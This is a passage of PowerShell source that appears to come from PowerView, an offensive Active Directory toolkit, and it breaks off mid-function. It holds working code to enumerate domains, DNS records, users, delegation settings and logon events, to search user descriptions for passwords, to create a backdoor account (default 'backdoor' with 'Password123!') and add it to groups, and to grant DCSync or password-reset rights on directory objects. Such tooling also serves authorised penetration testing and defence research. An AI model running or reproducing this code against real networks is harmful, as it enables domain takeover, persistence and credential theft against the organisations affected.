            $Prop = $Properties[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
            }
            catch {
                $ObjectProperties[$_] = $Prop[$_]
            }
        }
        elseif($Properties[$_].count -eq 1) {
            $ObjectProperties[$_] = $Properties[$_][0]
        }
        else {
            $ObjectProperties[$_] = $Properties[$_]
        }
    }

    New-Object -TypeName PSObject -Property $ObjectProperties
}









filter Get-DomainSearcher {


    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    if(-not $Credential) {
        if(-not $Domain) {
            $Domain = (Get-NetDomain).name
        }
        elseif(-not $DomainController) {
            try {
                
                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
            }
        }
    }
    elseif (-not $DomainController) {
        
        try {
            $DomainController = ((Get-NetDomain -Credential $Credential).PdcRoleOwner).Name
        }
        catch {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }

        if(!$DomainController) {
            throw "Get-DomainSearcher: Error in retrieving PDC for current domain"
        }
    }

    $SearchString = "LDAP://"

    if($DomainController) {
        $SearchString += $DomainController
        if($Domain){
            $SearchString += '/'
        }
    }

    if($ADSprefix) {
        $SearchString += $ADSprefix + ','
    }

    if($ADSpath) {
        if($ADSpath -Match '^GC://') {
            
            $DN = $AdsPath.ToUpper().Trim('/')
            $SearchString = ''
        }
        else {
            if($ADSpath -match '^LDAP://') {
                if($ADSpath -match "LDAP://.+/.+") {
                    $SearchString = ''
                }
                else {
                    $ADSpath = $ADSpath.Substring(7)
                }
            }
            $DN = $ADSpath
        }
    }
    else {
        if($Domain -and ($Domain.Trim() -ne "")) {
            $DN = "DC=$($Domain.Replace('.', ',DC='))"
        }
    }

    $SearchString += $DN
    Write-Verbose "Get-DomainSearcher search string: $SearchString"

    if($Credential) {
        Write-Verbose "Using alternate credentials for LDAP connection"
        $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
    }
    else {
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    }

    $Searcher.PageSize = $PageSize
    $Searcher.CacheResults = $False
    $Searcher
}


filter Convert-DNSRecord {

    param(
        [Parameter(Position=0, ValueFromPipelineByPropertyName=$True, Mandatory=$True)]
        [Byte[]]
        $DNSRecord
    )

    function Get-Name {
        
        [CmdletBinding()]
        param(
            [Byte[]]
            $Raw
        )

        [Int]$Length = $Raw[0]
        [Int]$Segments = $Raw[1]
        [Int]$Index =  2
        [String]$Name  = ""

        while ($Segments-- -gt 0)
        {
            [Int]$SegmentLength = $Raw[$Index++]
            while ($SegmentLength-- -gt 0) {
                $Name += [Char]$Raw[$Index++]
            }
            $Name += "."
        }
        $Name
    }

    $RDataLen = [BitConverter]::ToUInt16($DNSRecord, 0)
    $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
    $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

    $TTLRaw = $DNSRecord[12..15]
    
    $Null = [array]::Reverse($TTLRaw)
    $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

    $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
    if($Age -ne 0) {
        $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
    }
    else {
        $TimeStamp = "[static]"
    }

    $DNSRecordObject = New-Object PSObject

    if($RDataType -eq 1) {
        $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
        $Data = $IP
        $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'
    }

    elseif($RDataType -eq 2) {
        $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
        $Data = $NSName
        $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'
    }

    elseif($RDataType -eq 5) {
        $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
        $Data = $Alias
        $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'
    }

    elseif($RDataType -eq 6) {
        
        $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
    }

    elseif($RDataType -eq 12) {
        $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
        $Data = $Ptr
        $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'
    }

    elseif($RDataType -eq 13) {
        
        $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
    }

    elseif($RDataType -eq 15) {
        
        $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
    }

    elseif($RDataType -eq 16) {

        [string]$TXT  = ""
        [int]$SegmentLength = $DNSRecord[24]
        $Index = 25
        while ($SegmentLength-- -gt 0) {
            $TXT += [char]$DNSRecord[$index++]
        }

        $Data = $TXT
        $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'
    }

    elseif($RDataType -eq 28) {
        
        $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
    }

    elseif($RDataType -eq 33) {
        
        $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
    }

    else {
        $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
    }

    $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial
    $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
    $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
    $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp
    $DNSRecordObject | Add-Member Noteproperty 'Data' $Data
    $DNSRecordObject
}


filter Get-DNSZone {


    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)]
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential,

        [Switch]
        $FullData
    )

    $DNSSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential
    $DNSSearcher.filter="(objectClass=dnsZone)"

    if($DNSSearcher) {
        $Results = $DNSSearcher.FindAll()
        $Results | Where-Object {$_} | ForEach-Object {
            
            $Properties = Convert-LDAPProperty -Properties $_.Properties
            $Properties | Add-Member NoteProperty 'ZoneName' $Properties.name

            if ($FullData) {
                $Properties
            }
            else {
                $Properties | Select-Object ZoneName,distinguishedname,whencreated,whenchanged
            }
        }
        $Results.dispose()
        $DNSSearcher.dispose()
    }

    $DNSSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential -ADSprefix "CN=MicrosoftDNS,DC=DomainDnsZones"
    $DNSSearcher.filter="(objectClass=dnsZone)"

    if($DNSSearcher) {
        $Results = $DNSSearcher.FindAll()
        $Results | Where-Object {$_} | ForEach-Object {
            
            $Properties = Convert-LDAPProperty -Properties $_.Properties
            $Properties | Add-Member NoteProperty 'ZoneName' $Properties.name

            if ($FullData) {
                $Properties
            }
            else {
                $Properties | Select-Object ZoneName,distinguishedname,whencreated,whenchanged
            }
        }
        $Results.dispose()
        $DNSSearcher.dispose()
    }
}


filter Get-DNSRecord {


    param(
        [Parameter(Position=0, ValueFromPipelineByPropertyName=$True, Mandatory=$True)]
        [String]
        $ZoneName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)]
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    $DNSSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential -ADSprefix "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
    $DNSSearcher.filter="(objectClass=dnsNode)"

    if($DNSSearcher) {
        $Results = $DNSSearcher.FindAll()
        $Results | Where-Object {$_} | ForEach-Object {
            try {
                
                $Properties = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                $Properties | Add-Member NoteProperty 'ZoneName' $ZoneName

                
                if ($Properties.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                    
                    $Record = Convert-DNSRecord -DNSRecord $Properties.dnsrecord[0]
                }
                else {
                    $Record = Convert-DNSRecord -DNSRecord $Properties.dnsrecord
                }

                if($Record) {
                    $Record.psobject.properties | ForEach-Object {
                        $Properties | Add-Member NoteProperty $_.Name $_.Value
                    }
                }

                $Properties
            }
            catch {
                Write-Warning "ERROR: $_"
                $Properties
            }
        }
        $Results.dispose()
        $DNSSearcher.dispose()
    }
}


filter Get-NetDomain {


    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($Credential) {
        
        Write-Verbose "Using alternate credentials for Get-NetDomain"

        if(!$Domain) {
            
            $Domain = $Credential.GetNetworkCredential().Domain
            Write-Verbose "Extracted domain '$Domain' from -Credential"
        }
   
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch {
            Write-Verbose "The specified domain does '$Domain' not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
            $Null
        }
    }
    elseif($Domain) {
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch {
            Write-Verbose "The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else {
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    }
}


filter Get-NetForest {


    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($Credential) {
        
        Write-Verbose "Using alternate credentials for Get-NetForest"

        if(!$Forest) {
            
            $Forest = $Credential.GetNetworkCredential().Domain
            Write-Verbose "Extracted domain '$Forest' from -Credential"
        }
   
        $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        
        try {
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
        }
        catch {
            Write-Verbose "The specified forest '$Forest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
            $Null
        }
    }
    elseif($Forest) {
        $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
        try {
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
        }
        catch {
            Write-Verbose "The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust."
            return $Null
        }
    }
    else {
        
        $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    }

    if($ForestObject) {
        
        $ForestSid = (New-Object System.Security.Principal.NTAccount($ForestObject.RootDomain,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
        $Parts = $ForestSid -Split "-"
        $ForestSid = $Parts[0..$($Parts.length-2)] -join "-"
        $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
        $ForestObject
    }
}


filter Get-NetForestDomain {


    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        $Credential
    )

    $ForestObject = Get-NetForest -Forest $Forest -Credential $Credential

    if($ForestObject) {
        $ForestObject.Domains
    }
}


filter Get-NetForestCatalog {

    
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        $Credential
    )

    $ForestObject = Get-NetForest -Forest $Forest -Credential $Credential

    if($ForestObject) {
        $ForestObject.FindAllGlobalCatalogs()
    }
}


filter Get-NetDomainController {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($LDAP -or $DomainController) {
        
        Get-NetComputer -Domain $Domain -DomainController $DomainController -Credential $Credential -FullData -Filter '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    else {
        $FoundDomain = Get-NetDomain -Domain $Domain -Credential $Credential
        if($FoundDomain) {
            $Founddomain.DomainControllers
        }
    }
}








function Get-NetUser {


    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Switch]
        $Unconstrained,

        [Switch]
        $AllowDelegation,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {
        
        $UserSearcher = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize -Credential $Credential
    }

    process {
        if($UserSearcher) {

            
            if($Unconstrained) {
                Write-Verbose "Checking for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($AllowDelegation) {
                Write-Verbose "Checking for users who can be delegated"
                
                $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))"
            }
            if($AdminCount) {
                Write-Verbose "Checking for adminCount=1"
                $Filter += "(admincount=1)"
            }

            
            if($UserName) {
                
                $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName)$Filter)"
            }
            elseif($SPN) {
                $UserSearcher.filter="(&(samAccountType=805306368)(servicePrincipalName=*)$Filter)"
            }
            else {
                
                $UserSearcher.filter="(&(samAccountType=805306368)$Filter)"
            }

            $Results = $UserSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                
                $User = Convert-LDAPProperty -Properties $_.Properties
                $User.PSObject.TypeNames.Add('PowerView.User')
                $User
            }
            $Results.dispose()
            $UserSearcher.dispose()
        }
    }
}


function Add-NetUser {


    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName = 'backdoor',

        [ValidateNotNullOrEmpty()]
        [String]
        $Password = 'Password123!',

        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain
    )

    if ($Domain) {

        $DomainObject = Get-NetDomain -Domain $Domain
        if(-not $DomainObject) {
            Write-Warning "Error in grabbing $Domain object"
            return $Null
        }

        
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement

        
        
        $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), $DomainObject

        
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $Context

        
        $User.Name = $UserName
        $User.SamAccountName = $UserName
        $User.PasswordNotRequired = $False
        $User.SetPassword($Password)
        $User.Enabled = $True

        Write-Verbose "Creating user $UserName to with password '$Password' in domain $Domain"

        try {
            
            $User.Save()
            "[*] User $UserName successfully created in domain $Domain"
        }
        catch {
            Write-Warning '[!] User already exists!'
            return
        }
    }
    else {
        
        Write-Verbose "Creating user $UserName to with password '$Password' on $ComputerName"

        
        $ObjOu = [ADSI]"WinNT://$ComputerName"
        $ObjUser = $ObjOu.Create('User', $UserName)
        $ObjUser.SetPassword($Password)

        
        try {
            $Null = $ObjUser.SetInfo()
            "[*] User $UserName successfully created on host $ComputerName"
        }
        catch {
            Write-Warning '[!] Account already exists!'
            return
        }
    }

    
    if ($GroupName) {
        
        if ($Domain) {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -Domain $Domain
            "[*] User $UserName successfully added to group $GroupName in domain $Domain"
        }
        
        else {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -ComputerName $ComputerName
            "[*] User $UserName successfully added to group $GroupName on host $ComputerName"
        }
    }
}


function Add-NetGroupUser {


    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName,

        [String]
        $Domain
    )

    
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    
    if($ComputerName -and ($ComputerName -ne "localhost")) {
        try {
            Write-Verbose "Adding user $UserName to $GroupName on host $ComputerName"
            ([ADSI]"WinNT://$ComputerName/$GroupName,group").add("WinNT://$ComputerName/$UserName,user")
            "[*] User $UserName successfully added to group $GroupName on $ComputerName"
        }
        catch {
            Write-Warning "[!] Error adding user $UserName to group $GroupName on $ComputerName"
            return
        }
    }

    
    else {
        try {
            if ($Domain) {
                Write-Verbose "Adding user $UserName to $GroupName on domain $Domain"
                $CT = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                $DomainObject = Get-NetDomain -Domain $Domain
                if(-not $DomainObject) {
                    return $Null
                }
                
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $CT, $DomainObject            
            }
            else {
                
                Write-Verbose "Adding user $UserName to $GroupName on localhost"
                $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)
            }

            
            $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($Context,$GroupName)

            
            $Group.Members.add($Context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)

            
            $Group.Save()
        }
        catch {
            Write-Warning "Error adding $UserName to $GroupName : $_"
        }
    }
}


function Get-UserProperty {


    [CmdletBinding()]
    param(
        [String[]]
        $Properties,

        [String]
        $Domain,
        
        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )

    if($Properties) {
        
        $Properties = ,"name" + $Properties
        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential | Select-Object -Property $Properties
    }
    else {
        
        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize -Credential $Credential | Select-Object -First 1 | Get-Member -MemberType *Property | Select-Object -Property 'Name'
    }
}


filter Find-UserField {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SearchTerm = 'pass',

        [String]
        $SearchField = 'description',

        [String]
        $ADSpath,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [Management.Automation.PSCredential]
        $Credential
    )
 
    Get-NetUser -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Credential $Credential -Filter "($SearchField=*$SearchTerm*)" -PageSize $PageSize | Select-Object samaccountname,$SearchField
}


filter Get-UserEvent {


    Param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName = $Env:ComputerName,

        [String]
        [ValidateSet("logon","tgt","all")]
        $EventType = "logon",

        [DateTime]
        $DateStart = [DateTime]::Today.AddDays(-5),

        [Management.Automation.PSCredential]
        $Credential
    )

    if($EventType.ToLower() -like "logon") {
        [Int32[]]$ID = @(4624)
    }
    elseif($EventType.ToLower() -like "tgt") {
        [Int32[]]$ID = @(4768)
    }
    else {
        [Int32[]]$ID = @(4624, 4768)
    }

    if($Credential) {
        Write-Verbose "Using alternative credentials"
        $Arguments = @{
            'ComputerName' = $ComputerName;
            'Credential' = $Credential;
            'FilterHashTable' = @{ LogName = 'Security'; ID=$ID; StartTime=$DateStart};
            'ErrorAction' = 'SilentlyContinue';
        }
    }
    else {
        $Arguments = @{
            'ComputerName' = $ComputerName;
            'FilterHashTable' = @{ LogName = 'Security'; ID=$ID; StartTime=$DateStart};
            'ErrorAction' = 'SilentlyContinue';            
        }
    }

    
    Get-WinEvent @Arguments | ForEach-Object {

        if($ID -contains 4624) {    
            
            if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))') {
                if($Matches) {
                    $LogonType = $Matches[0].trim()
                    $Matches = $Null
                }
            }
            else {
                $LogonType = ""
            }

            
            if (($LogonType -eq 2) -or ($LogonType -eq 3)) {
                try {
                    
                    if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)') {
                        if($Matches) {
                            $UserName = $Matches[0].split("`n")[2].split(":")[1].trim()
                            $Domain = $Matches[0].split("`n")[3].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }
                    if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)') {
                        if($Matches) {
                            $Address = $Matches[0].split("`n")[2].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }

                    
                    if ($UserName -and (-not $UserName.endsWith('$')) -and ($UserName -ne 'ANONYMOUS LOGON')) {
                        $LogonEventProperties = @{
                            'Domain' = $Domain
                            'ComputerName' = $ComputerName
                            'Username' = $UserName
                            'Address' = $Address
                            'ID' = '4624'
                            'LogonType' = $LogonType
                            'Time' = $_.TimeCreated
                        }
                        New-Object -TypeName PSObject -Property $LogonEventProperties
                    }
                }
                catch {
                    Write-Verbose "Error parsing event logs: $_"
                }
            }
        }
        if($ID -contains 4768) {
            
            try {
                if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)') {
                    if($Matches) {
                        $Username = $Matches[0].split("`n")[1].split(":")[1].trim()
                        $Domain = $Matches[0].split("`n")[2].split(":")[1].trim()
                        $Matches = $Null
                    }
                }

                if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)') {
                    if($Matches) {
                        $Address = $Matches[0].split("`n")[1].split(":")[-1].trim()
                        $Matches = $Null
                    }
                }

                $LogonEventProperties = @{
                    'Domain' = $Domain
                    'ComputerName' = $ComputerName
                    'Username' = $UserName
                    'Address' = $Address
                    'ID' = '4768'
                    'LogonType' = ''
                    'Time' = $_.TimeCreated
                }

                New-Object -TypeName PSObject -Property $LogonEventProperties
            }
            catch {
                Write-Verbose "Error parsing event logs: $_"
            }
        }
    }
}


function Get-ObjectAcl {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $SamAccountName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $Name = "*",

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $DistinguishedName = "*",

        [Switch]
        $ResolveGUIDs,

        [String]
        $Filter,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [String]
        [ValidateSet("All","ResetPassword","WriteMembers")]
        $RightsFilter,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize 

        
        if($ResolveGUIDs) {
            $GUIDs = Get-GUIDMap -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }

    process {

        if ($Searcher) {

            if($SamAccountName) {
                $Searcher.filter="(&(samaccountname=$SamAccountName)(name=$Name)(distinguishedname=$DistinguishedName)$Filter)"  
            }
            else {
                $Searcher.filter="(&(name=$Name)(distinguishedname=$DistinguishedName)$Filter)"  
            }
  
            try {
                $Results = $Searcher.FindAll()
                $Results | Where-Object {$_} | ForEach-Object {
                    $Object = [adsi]($_.path)

                    if($Object.distinguishedname) {
                        $Access = $Object.PsBase.ObjectSecurity.access
                        $Access | ForEach-Object {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]

                            if($Object.objectsid[0]){
                                $S = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                            }
                            else {
                                $S = $Null
                            }
                            
                            $_ | Add-Member NoteProperty 'ObjectSID' $S
                            $_
                        }
                    }
                } | ForEach-Object {
                    if($RightsFilter) {
                        $GuidFilter = Switch ($RightsFilter) {
                            "ResetPassword" { "00299570-246d-11d0-a768-00aa006e0529" }
                            "WriteMembers" { "bf9679c0-0de6-11d0-a285-00aa003049e2" }
                            Default { "00000000-0000-0000-0000-000000000000"}
                        }
                        if($_.ObjectType -eq $GuidFilter) { $_ }
                    }
                    else {
                        $_
                    }
                } | ForEach-Object {
                    if($GUIDs) {
                        
                        $AclProperties = @{}
                        $_.psobject.properties | ForEach-Object {
                            if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {
                                try {
                                    $AclProperties[$_.Name] = $GUIDS[$_.Value.toString()]
                                }
                                catch {
                                    $AclProperties[$_.Name] = $_.Value
                                }
                            }
                            else {
                                $AclProperties[$_.Name] = $_.Value
                            }
                        }
                        New-Object -TypeName PSObject -Property $AclProperties
                    }
                    else { $_ }
                }
                $Results.dispose()
                $Searcher.dispose()
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function Add-ObjectAcl {


    [CmdletBinding()]
    Param (
        [String]
        $TargetSamAccountName,

        [String]
        $TargetName = "*",

        [Alias('DN')]
        [String]
        $TargetDistinguishedName = "*",

        [String]
        $TargetFilter,

        [String]
        $TargetADSpath,

        [String]
        $TargetADSprefix,

        [String]
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        $PrincipalSID,

        [String]
        $PrincipalName,

        [String]
        $PrincipalSamAccountName,

        [String]
        [ValidateSet("All","ResetPassword","WriteMembers","DCSync")]
        $Rights = "All",

        [String]
        $RightsGUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize

        if($PrincipalSID) {
            $ResolvedPrincipalSID = $PrincipalSID
        }
        else {
            $Principal = Get-ADObject -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize
            
            if(!$Principal) {
                throw "Error resolving principal"
            }
            $ResolvedPrincipalSID = $Principal.objectsid
        }
        if(!$ResolvedPrincipalSID) {
            throw "Error resolving principal"
        }
    }

    process {

        if ($Searcher) {

            if($TargetSamAccountName) {
                $Searcher.filter="(&(samaccountname=$TargetSamAccountName)(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)"  
            }
            else {
                $Searcher.filter="(&(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)"  
            }
  
            try {
                $Results = $Searcher.FindAll()
                $Results | Where-Object {$_} | ForEach-Object {

                    

                    $TargetDN = $_.Properties.distinguishedname

                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ResolvedPrincipalSID)
                    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
                    $ControlType = [System.Security.AccessControl.AccessControlType] "Allow"
                    $ACEs = @()

                    if($RightsGUID) {
                        $GUIDs = @($RightsGUID)
                    }
                    else {
                        $GUIDs = Switch ($Rights) {
                            
                            "ResetPassword" { "00299570-246d-11d0-a768-00aa006e0529" }
                            
                            "WriteMembers" { "bf9679c0-0de6-11d0-a285-00aa003049e2" }
                            
                            
                            
                            
                            "DCSync" { "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", "89e95b76-444d-4c62-991a-0facbeda640c"}
                        }
                    }

                    if($GUIDs) {
                        foreach($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$NewGUID,$InheritanceType
                        }
                    }
                    else {
                        
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericAll"
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$InheritanceType
                    }

                    Write-Verbose "Granting principal $ResolvedPrincipalSID '$Rights' on $($_.Properties.distinguishedname)"

                    try {
                        
                        ForEach ($ACE in $ACEs) {
                            Write-Verbose "Granting principal $ResolvedPrincipalSID '$($ACE.ObjectType)' rights on $($_.Properties.distinguishedname)"
                            $Object = [adsi]($_.path)
                            $Object.PsBase.ObjectSecurity.AddAccessRule($ACE)
